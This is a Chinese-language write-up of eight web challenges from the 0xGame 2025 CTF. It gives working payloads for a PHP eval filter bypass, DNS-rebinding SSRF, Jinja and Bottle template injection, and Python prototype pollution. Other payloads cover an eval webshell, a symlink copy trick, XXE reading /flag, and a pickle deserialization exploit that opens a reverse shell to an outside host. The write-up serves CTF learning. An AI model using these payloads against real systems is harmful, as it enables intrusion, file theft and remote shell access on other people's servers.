---
title: 0xgameCTF2025 Web部分题解
categories: CTF
---

## 一.Web

    ### 1.RCE1

        ```PowerShell
        <?php
        error_reporting(0);
        highlight_file(__FILE__);
        $rce1 = $_GET['rce1'];
        $rce2 = $_POST['rce2'];
        $real_code = $_POST['rce3'];
        
        $pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';
        
        function check(string $text): bool {
            global $pattern;
            return (bool) preg_match($pattern, $text);
        }
        
        
        if (isset($rce1) && isset($rce2)){
            if(md5($rce1) === md5($rce2) && $rce1 !== $rce2){
                if(!check($real_code)){
                    eval($real_code);
                } else {
                    echo "Don't hack me ~";
                }
            } else {
                echo "md5 do not match correctly";
            }
        }
        else{
            echo "Please provide both rce1 and rce2";
        }
        ?>
        ```

第一层WAF：

```PowerShell
if (isset($rce1) && isset($rce2)){
    if(md5($rce1) === md5($rce2) && $rce1 !== $rce2)
```

数组绕过，且rce1的值≠rce2  

因此赋值rce1为rce1[]=1 rce2[]=2

第二层WAF：

```PowerShell
$pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';
```

这里我们使用反引号bypass 

```PowerShell
print `tac /f???`;
```

EXP

```PowerShell
GET部分:
http://80-3bc36d6e-c31d-4778-bb0c-3a099ffa38c9.challenge.ctfplus.cn/?rce1[]=1
POST:
rce2[]=2&rce3=print `tac /f???`;
```

### 二.DNS想要玩

    ```Python
    from flask import Flask, request
    from urllib.parse import urlparse
    import socket
    import os
    
    app = Flask(__name__)
    
    BlackList=[
        'localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4'
    ]
    
    def check(url):
        url = urlparse(url)
        host = url.hostname
        host_acscii = host.encode('idna').decode('utf-8')
        return socket.gethostbyname(host_acscii) == '114.5.1.4'
    
    @app.route('/')
    def index():
        return open(__file__).read()
    
    @app.route('/ssrf')
    def ssrf():
        raw_url = request.args.get('url')
        if not raw_url:
            return 'URL Needed'
        for u in BlackList:
            if u in raw_url:
                return 'Invaild URL'
        if check(raw_url):
            return os.popen(request.args.get('cmd')).read()
        else:
            return "NONONO"
    
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=8000)
    ```

我们先看黑名单:

```Python
'localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4'
```

根据题目提示我们想到了 考点是SSRF知识点的DNS重绑定攻击

打开网站:https://lock.cmpxchg8b.com/rebinder.html

题目中明确要求 地址必须=114.5.1.4 因此A输入127.0.0.1 B 输入:114.5.1.4

生成域名:7f000001.72050104.rbndr.us

传参: 

```Python
http://8000-81948a0f-5eb0-4505-a4f5-28a06ac7a4ea.challenge.ctfplus.cn/ssrf?url=http://7f000001.72050104.rbndr.us&cmd=cat /flag
```

第二种解法: 将ip转换为十进制格式：

114.5.1.4→`1912930564`

{% asset_img image.png %}

### 三.404 Not fond

    {% asset_img image_1.png %}

乍一看没有任何信息 尝试在路径后面输入{{1+1}}

{% asset_img image_2.png %}

通过FUZZ 我们可以发现过滤了很多东西 

blacklist:., __ ,gloabs ......

使用payload：{lipsum['__**glo''bals__**']['o''s']['pop''en']("cat /f*")'re''ad'}}

即可进行bypass 

flag:0xGame{404_Not_Found_rEvenGe_Still_SSTI!}

### 四:绳网委托Bottle版

根据提示我们可得知该Web页使用了Bottle框架

输入{{7*7}} 

{% asset_img image_3.png %}

发现大括号被过滤 :

搜索文章寻找Bypass方法  可以使用多行字符串的方法将其过滤

```Python
"""
 % import os   ->  导入OS库
 % flag_data = os.popen("cat /f*").read() ->os.popen执行查看flag的命令
 % __import__('bottle').abort(200, flag_data) ->使用abort 将执行的命令渲染给前端
 """

```

{% asset_img image_4.png %}

### 五.Lemon_RevEnge

    下载源码

    ```Python
    from flask import Flask,request,render_template
    import json
    import os
    
    app = Flask(__name__)
    
    def merge(src, dst):
        for k, v in src.items():
            if hasattr(dst, '__getitem__'):
                if dst.get(k) and type(v) == dict:
                    merge(v, dst.get(k))
                else:
                    dst[k] = v
            elif hasattr(dst, k) and type(v) == dict:
                merge(v, getattr(dst, k))
            else:
                setattr(dst, k, v)
    
    class Dst():
        def __init__(self):
            pass
    
    Game0x = Dst()
    
    @app.route('/',methods=['POST', 'GET'])
    def index():
        if request.data:
            merge(json.loads(request.data), Game0x)
        return render_template("index.html", Game0x=Game0x)
    
    @app.route("/<path:path>")
    def render_page(path):
        if not os.path.exists("templates/" + path):
            return "Not Found", 404
        return render_template(path)
    
    
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=9000)
    
    ```

深度递归合并对象，一眼鉴定为python原型链污染

```HTTP
POST / HTTP/1.1
Host: nc1.ctfplus.cn:41071
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: _clck=1hda1y2%5E2%5Eg57%5E0%5E2200; _ga_BFDVYZJ3DE=GS2.1.s1776153460$o16$g1$t1776153487$j33$l0$h0; _ga=GA1.1.1013586492.1773301002
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 143

{
    "__init__": {
        "__globals__": {
            "app": {
                "_static_folder": "/"
            }
        }
    }
}
```

将根挂载到/static下，可以读取/下的任意文件

```HTTP
GET /static/flag HTTP/1.1
Host: nc1.ctfplus.cn:41071
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: _clck=1hda1y2%5E2%5Eg57%5E0%5E2200; _ga_BFDVYZJ3DE=GS2.1.s1776153460$o16$g1$t1776153487$j33$l0$h0; _ga=GA1.1.1013586492.1773301002
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 143
```

flag:0xGame{Welcome_to_Easy_Pollute~}

### 六:放开我的变量

    {% asset_img image_5.png %}

        第一步： 目录扫描

        ```Shell
        dirsearch -u "http://80-7e0511f2-e254-40b2-8e7a-ce612c89d4d8.challenge.ctfplus.cn/"                                                                                                        ─╯
        /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
          from pkg_resources import DistributionNotFound, VersionConflict
        
          _|. _ _  _  _  _ _|_    v0.4.3
         (_||| _) (/_(_|| (_| )
        
        Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
        
        Output File: /home/kali/Desktop/reports/http_80-7e0511f2-e254-40b2-8e7a-ce612c89d4d8.challenge.ctfplus.cn/__26-04-14_04-25-15.txt
        
        Target: http://80-7e0511f2-e254-40b2-8e7a-ce612c89d4d8.challenge.ctfplus.cn/
        
        [04:25:15] Starting: 
        [04:25:16] 403 -  325B  - /.ht_wsr.txt                                      
        [04:25:16] 403 -  325B  - /.htaccess.bak1                                   
        [04:25:16] 403 -  325B  - /.htaccess.orig                                   
        [04:25:16] 403 -  325B  - /.htaccess.save                                   
        [04:25:16] 403 -  325B  - /.htaccess.sample
        [04:25:16] 403 -  325B  - /.htaccess_sc                                     
        [04:25:16] 403 -  325B  - /.htaccess_orig                                   
        [04:25:16] 403 -  325B  - /.htaccess_extra
        [04:25:16] 403 -  325B  - /.htaccessBAK
        [04:25:16] 403 -  325B  - /.htaccessOLD
        [04:25:16] 403 -  325B  - /.htaccessOLD2
        [04:25:16] 403 -  325B  - /.htm                                             
        [04:25:16] 403 -  325B  - /.html                                            
        [04:25:16] 403 -  325B  - /.httr-oauth                                      
        [04:25:16] 403 -  325B  - /.htpasswds
        [04:25:16] 403 -  325B  - /.htpasswd_test
        [04:25:26] 200 -    5KB - /debug/pprof/goroutine?debug=1                    
        [04:25:26] 301 -   48B  - /debug/pprof  ->  /debug/pprof/                   
        [04:25:26] 200 -    3KB - /debug/pprof/                                     
        [04:25:26] 200 -   42KB - /debug/pprof/heap                                 
        [04:25:27] 200 -   49KB - /debug/pprof/trace                                
        [04:25:28] 200 -   66B  - /health                                           
        [04:25:30] 200 -  129B  - /metrics                                          
        [04:25:32] 200 -    2B  - /ping                                             
        [04:25:41] 200 -  117B  - /robots.txt                                       
        [04:25:44] 403 -  325B  - /server-status/                                   
        [04:25:44] 403 -  325B  - /server-status
        [####################] 100%  11460/11460       467/s       job:1/1  errors:10
        ```

发现robots.txt

```Shell
Disallow:/asdback.php
allow:https://sj1t.cn/2024/01/04/%E5%8A%A8%E6%80%81Flag%E5%AE%9E%E7%8E%B0/index.html
```

访问:asdback.php

```Shell
 <?php

highlight_file(__FILE__);
echo("Please Input Your CMD");
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
?> Please Input Your CMD
```

蚁剑直接连上去:

{% asset_img image_6.png %}

sudo -l 无果 尝试查看哪些进程由root 启动

```Shell
(www-data:/var/www/html) $ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  76740 23952 ?        Ss   08:20   0:00 apache2 -DFOREGROUND
root           7  0.0  0.0   3900  2264 ?        S    08:20   0:00 /bin/bash /start.sh
www-data      21  0.0  0.0  76944 11904 ?        S    08:20   0:00 apache2 -DFOREGROUND
www-data      23  0.0  0.0  76944 11900 ?        S    08:20   0:00 apache2 -DFOREGROUND
www-data     243  0.0  0.0  76936 11780 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     248  0.0  0.0  76936 11624 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     253  0.0  0.0  76936 11864 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     257  0.0  0.0  76936 11624 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     258  0.0  0.0  76936 11628 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     265  0.0  0.0  76936 11672 ?        S    08:25   0:00 apache2 -DFOREGROUND
www-data     285  0.0  0.0  76936 11908 ?        S    08:26   0:00 apache2 -DFOREGROUND
www-data     287  0.0  0.0  76936 11624 ?        S    08:26   0:00 apache2 -DFOREGROUND
root         543  0.0  0.0   2396   508 ?        S    08:33   0:00 sleep 5s
www-data     544  0.0  0.0   2484   576 ?        S    08:33   0:00 sh -c /bin/sh -c "cd "/var/www/html";ps -aux;echo b103ef1b;pwd;echo 66650abc907" 2>&1
www-data     545  0.0  0.0   2484   516 ?        S    08:33   0:00 /bin/sh -c cd /var/www/html;ps -aux;echo b103ef1b;pwd;echo 66650abc907
www-data     546  0.0  0.0   6760  2920 ?        R    08:33   0:00 ps -aux
```

发现/start.sh 我们对该脚本进行审计:

```Shell
(www-data:/var/www/html) $ cat /start.sh
#!/bin/bash
cd /var/www/html/primary 
while :
do
    cp -P * /var/www/html/marstream/ -> #将/var/www/html/primary下的所有文件拷贝到/var/www/html/marstream/
    chmod 755 -R /var/www/html/marstream/  #给目录赋予775权限
    sleep 5s
done &
exec apache2-foreground
```

我们可以先切换到/var/www/html/primary 目录下 创建一个 为"-H" 的文件 -P 参数只会复制链接并不会将文件内容一并复制，我们创建一个参数文件-H 这样可以连文件内容一并复制，接着创建/flag的软连接，最后查看/var/www/html/marstream/下/flag的软连接

```Shell
echo "" > -H
ln -s /flag f
cat /var/www/html/marstream/f 
```

flag：0xGame{6dbdb141-9c93-44e8-aa8c-3b6dda89612d}

### 七:留言板(粉)

    #### 预期解：

    根据题目提示登录到login.php

    这里试了好多漏洞没成功，看到题目打了XXE的标签 试了几下也不行

    {% asset_img image_7.png %}

    后面试了一下弱口令: admin: admin123 

    成功登录：

    {% asset_img image_8.png %}

    题目有一个XXE的标签 因此想到在里面输入XXE payload

    ```XML
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE ANY[
        <!ENTITY Quan SYSTEM "file:///flag">
    ]>
    <login>
      <username>&Quan;</username>
      <password>test</password>
    </login>
    ```

    flag:  0xGame{1a903b96-173a-8b3d-8a37-a81934dc4187_xxe114514}

    #### 非预期解：

    ```Shell
    
    ╭─ /home/kali/Desktop ······························································································································································ with r
    ╰─❯ dirsearch  -u "http://8000-00c09d24-2190-43e2-9364-913637458d46.challenge.ctfplus.cn/"                                                                                                 
    /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
      from pkg_resources import DistributionNotFound, VersionConflict
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
    
    Output File: /home/kali/Desktop/reports/http_8000-00c09d24-2190-43e2-9364-913637458d46.challenge.ctfplus.cn/__26-04-14_21-48-18.txt
    
    Target: http://8000-00c09d24-2190-43e2-9364-913637458d46.challenge.ctfplus.cn/
    
    [21:48:18] Starting: 
    [21:48:31] 200 -    6KB - /debug/pprof/goroutine?debug=1                    
    [21:48:31] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
    [21:48:31] 200 -    3KB - /debug/pprof/
    [21:48:31] 200 -   43KB - /debug/pprof/heap                                 
    [21:48:32] 200 -   30KB - /debug/pprof/trace                                
    [21:48:32] 200 -   83B  - /docker-compose.yml                               
    [21:48:32] 200 -  213B  - /Dockerfile                                       
    [21:48:45] 200 -   65B  - /health                                           
    [21:48:48] 200 -    2KB - /login.php                                        
    [21:48:49] 200 -  129B  - /metrics                                           
    [21:48:51] 200 -    2B  - /ping                                              
                                           
    ```

    直接访问/Dockerfile目录

    ```Dockerfile
    FROM php:8.1-cli
    
    WORKDIR /var/www/html
    COPY . .
    
    # 写 flag
    RUN echo "0xGame{1a903b96-173a-8b3d-8a37-a81934dc4187_xxe114514}" > /flag
    
    EXPOSE 8000
    # 启动内置 server
    CMD ["php", "-S", "0.0.0.0:8000"]
    ```

### 八.马哈鱼商店

    打开页面注册账号，登录:

    {% asset_img image_9.png %}

    买Flag发现是假的，接下来我们买Pickle

    ```HTTP
    POST /buy HTTP/1.1
    Host: 9000-ec80f9f9-e3ec-49e4-9a0f-d19d2c3a84fa.challenge.ctfplus.cn
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 28
    Origin: http://9000-ec80f9f9-e3ec-49e4-9a0f-d19d2c3a84fa.challenge.ctfplus.cn
    Connection: keep-alive
    Referer: http://9000-ec80f9f9-e3ec-49e4-9a0f-d19d2c3a84fa.challenge.ctfplus.cn/vamos
    Cookie: _clck=1hda1y2%5E2%5Eg58%5E0%5E2200; _ga_BFDVYZJ3DE=GS2.1.s1776240500$o22$g1$t1776242204$j60$l0$h0; _ga=GA1.1.1013586492.1773301002; session=eyJ1c2VyIjoiMSJ9.ad9OfA.AysQ3yAUvvac8KEH-trbKvS0u-8
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    pid=8&discount=0.00000000001
    ```

    抓包改折扣  买到源码

    ```Python
    # 核心黑名单：过滤两个字节！
    BlackList = [b'', b'\x1e']
    @app.route('/pickle_dsa')
    def pic():    
        data = request.args.get('data')  
        if not data:
          return "Use GET To Send Your Loved Data"
        try:
            data = base64.b64decode(data)
        except Exception:
            return "Cao!!!"
    
        for b in BlackList:
            if b in data:
                return "卡了"
        p = pickle.loads(data)
        print(p)
        return f"Vamos! {p}"
    ```

    过滤了字节操作码b 

    protocol=2,3 是二进制协议，会包含各种控制字符，容易触发 0x1E 检测

    所以我们使用文本操作码protocol=0 反弹shell

    ```Python
    import pickle
    import base64
    
    cmd = '''export RHOST="5508.axzt.top";export RPORT=40025;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' '''
    
    class Exp:
        def __reduce__(self):
            return (__import__("os").syste m, (cmd,))
    
    data = pickle.dumps(Exp(), protocol=0)
    
    assert b"\x00" not in data
    assert b"\x1e" not in data
    
    print(base64.b64encode(data).decode())
    ```

    vps监听4444：（内网穿透）

    ```Shell
    root@JfyEA06135:~# nc -lvp 4444
    Listening on 0.0.0.0 4444
    Connection received on 103.236.71.253 50556
    $ env
    env
    KUBERNETES_SERVICE_PORT=449
    KUBERNETES_PORT=1449
    RPORT=40025
    HOSTNAME=dep-ec80f9f9-e3ec-49e4-9a0f-d19d2c3a84fa-7cf98667c8-88zqj
    HOME=/home/appuser
    GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
    PYTHON_SHA256=c30bb24b7f1e9a19b11b55a546434f74e739bb4c271a3e3a80ff4380d49f7adb
    WERKZEUG_SERVER_FD=3
    flag=0xGame{You_Have_Learned_How_to_Buy_Pickle!!}
    KUBERNETES_PORT_443_TCP_ADDR=unix:///var/run/docker.sock
    PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    KUBERNETES_PORT_443_TCP_PORT=1449
    KUBERNETES_PORT_443_TCP_PROTO=
    LANG=C.UTF-8
    PYTHON_VERSION=3.12.11
    KUBERNETES_SERVICE_PORT_HTTPS=449
    KUBERNETES_PORT_443_TCP=
    KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock
    PWD=/app
    RHOST=5508.axzt.top
    $
    ```

    flag：0xGame{You_Have_Learned_How_to_Buy_Pickle!!}

    

